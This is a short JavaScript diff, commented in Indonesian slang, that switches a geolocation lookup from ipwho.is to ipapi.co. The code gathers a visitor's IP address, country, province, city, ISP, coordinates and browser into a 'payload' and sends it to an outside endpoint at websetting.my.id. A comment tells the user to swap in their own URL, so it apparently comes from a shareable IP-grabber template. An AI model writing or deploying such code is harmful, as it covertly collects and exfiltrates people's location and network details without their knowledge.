@@ -93,17 +93,16 @@
         browser: detectBrowser(ua) 
     };
 
-    // PAKE IPWHO.IS BIAR DAPET KODE TELEPON & BENDERA
-    fetch("https://ipwho.is/")
+    // BALIK PAKE IPAPI.CO
+    fetch("https://ipapi.co/json/")
         .then(function(r){ return r.json(); })
         .then(function(d){
             payload.ip = d.ip || "-";
-            payload.negara = d.country || "-";
+            payload.negara = d.country_name || "-";
             payload.negaraKode = d.country_code || "ID"; 
-            payload.dial = d.dial || "+62"; 
             payload.prov = d.region || "-";
             payload.kota = d.city || "-";
-            payload.isp = d.connection?.isp || "-";
+            payload.isp = d.org || "-";
             payload.koord = (d.latitude||"-")+" , "+(d.longitude||"-");
             
             return fetch("https://websetting.my.id/api/send", { // SESUAIIN URL LU
